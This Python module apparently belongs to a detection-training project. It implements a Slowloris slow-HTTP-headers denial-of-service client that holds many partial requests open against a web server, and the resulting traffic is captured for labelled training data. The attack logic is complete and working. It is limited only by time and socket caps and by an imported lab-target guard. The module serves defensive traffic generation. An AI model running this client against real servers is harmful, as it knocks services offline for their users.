"""Slowloris (slow-HTTP-headers) lab generator — implemented from scratch.

This is a minimal, self-contained slow-headers client written here from the
published technique; no third-party attack script is fetched or executed. It

  * opens up to ``max_sockets`` TCP connections to the lab HTTP endpoint,
  * sends an incomplete HTTP request on each and then dribbles one extra header
    line per socket every few seconds so the request never completes,
  * is strictly bounded by ``duration`` and tears every socket down on exit,
    timeout, or error.

It targets the lab endpoint only (guarded) and is capped in both dimensions
(time and socket count), so it produces a representative ``c2_beaconing``-adjacent
slow-DoS traffic shape for training without being an open-ended attack tool.

Runnable as a module so the capture orchestrator can spawn it::

    python -m igu_sentinel.traffic_gen.lab.slowloris --target <lab> --duration 10
"""
from __future__ import annotations

import argparse
import logging
import random
import socket
import sys
import time
from pathlib import Path
from typing import List

from igu_sentinel.traffic_gen.lab._guard import validate_lab_target
from igu_sentinel.traffic_gen.lab.capture import DEFAULT_IFACE, capture_lab_run

log = logging.getLogger("igu_sentinel.traffic_gen.lab")

THREAT_CLASS = "volumetric_ddos"

_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
)


def _open_socket(target: str, port: int) -> socket.socket | None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((target, int(port)))
        # Partial request: a GET line and a couple of headers, but no blank line,
        # so the server keeps the connection open waiting for the rest.
        s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send(f"User-Agent: {random.choice(_USER_AGENTS)}\r\n".encode())
        s.send(b"Accept-language: en-US,en,q=0.5\r\n")
        return s
    except OSError:
        try:
            s.close()
        except OSError:
            pass
        return None


def slowloris_attack(target: str, port: int, duration: int, max_sockets: int = 50) -> int:
    """Run a bounded slow-headers attack. Returns the peak number of live sockets.

    Guarded: refuses any non-lab target.
    """
    validate_lab_target(target)
    max_sockets = max(1, int(max_sockets))
    deadline = time.monotonic() + max(1, int(duration))
    socks: List[socket.socket] = []
    peak = 0
    try:
        # Open the initial pool.
        for _ in range(max_sockets):
            if time.monotonic() >= deadline:
                break
            s = _open_socket(target, port)
            if s is not None:
                socks.append(s)
        peak = len(socks)

        # Keep-alive loop: dribble one header per socket, reopening any that died.
        while time.monotonic() < deadline:
            for s in list(socks):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except OSError:
                    socks.remove(s)
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(socks) < max_sockets and time.monotonic() < deadline:
                s = _open_socket(target, port)
                if s is None:
                    break
                socks.append(s)
            peak = max(peak, len(socks))
            time.sleep(min(10, max(1, int(duration) // 3)))
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
    return peak


def run(
    target: str,
    duration: int,
    *,
    port: int = 80,
    max_sockets: int = 50,
    iface: str = DEFAULT_IFACE,
    lab_suffix=None,
    out_root: Path | None = None,
    _popen=None,
    _sleep=None,
    **_params,
) -> Path:
    """Launch the bounded slow-headers client against ``target`` and capture it.

    Returns the captured pcap path.

    Raises:
        ValueError: if ``target`` is not a permitted lab endpoint.
        LabToolMissing: if tshark is not installed.
    """
    validate_lab_target(target, lab_suffix=lab_suffix)

    cmd = [
        sys.executable, "-m", "igu_sentinel.traffic_gen.lab.slowloris",
        "--target", target,
        "--duration", str(int(duration)),
        "--port", str(int(port)),
        "--max-sockets", str(int(max_sockets)),
    ]
    return capture_lab_run(
        threat_class=THREAT_CLASS,
        target=target,
        duration=duration,
        tool_cmd=cmd,
        tool_name=None,  # runs under the current interpreter
        iface=iface,
        lab_suffix=lab_suffix,
        out_root=out_root,
        _popen=_popen,
        _sleep=_sleep,
    )


def _main(argv: List[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Bounded lab slowloris client.")
    parser.add_argument("--target", required=True)
    parser.add_argument("--duration", type=int, default=10)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--max-sockets", type=int, default=50)
    args = parser.parse_args(argv)

    validate_lab_target(args.target)  # guard again inside the child
    peak = slowloris_attack(args.target, args.port, args.duration, args.max_sockets)
    print(f"[lab-slowloris] held up to {peak} slow connections to {args.target}:{args.port} for {args.duration}s")
    return 0


if __name__ == "__main__":
    raise SystemExit(_main())
